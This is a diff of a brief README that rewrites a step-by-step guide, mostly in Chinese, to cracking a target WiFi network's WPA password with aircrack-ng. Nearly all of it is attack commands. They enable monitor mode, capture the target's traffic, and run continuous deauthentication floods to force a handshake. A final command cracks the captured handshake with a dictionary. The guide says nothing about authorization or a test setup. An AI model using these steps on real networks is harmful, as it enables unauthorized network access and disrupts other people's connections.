@@ -2,13 +2,13 @@
 A sample use guide for aircrack-ng in linux
 
 ### Step
-- iwconfig	--查看网卡列表
-- airmon-ng start <网卡名>	--打开用来破解的网卡
-- iwconfig	--重新查看网卡列表，start后网卡名会变
-- airodump-ng <网卡名>	--查看wifi列表
-- airodump-ng -c <channel> --bssid <wifi破解目标的bssid> -w <文件名> <网卡名>	--抓取目wifi的网络包并存储
-- aireplay-ng -0 0 -a <bssid> <网卡名>	--获取握手包，直到出现WPA handshake
-- aircrack-ng -w <字典名> -b <bssid> 文件名*.cap	--利用字典破解.cap数据包
+1. 查看网卡列表: iwconfig
+2. 启用用来破解的网卡: airmon-ng start <网卡名>
+3. 重新查看网卡列表，指定网卡启用后网卡名会变: iwconfig
+4. 查看 wifi 列表: airodump-ng <网卡名>
+5. 抓取目标 wifi 的网络包并存储: airodump-ng -c <channel> --bssid <wifi 破解目标的bssid> -w <文件名> <网卡名>
+6. 获取握手包，直到出现 WPA handshake: aireplay-ng -0 0 -a <bssid> <网卡名>
+7. 利用字典破解 .cap 数据包: aircrack-ng -w <字典名> -b <bssid> 文件名*.cap
 
 ### Example
 <pre><code>iwconfig
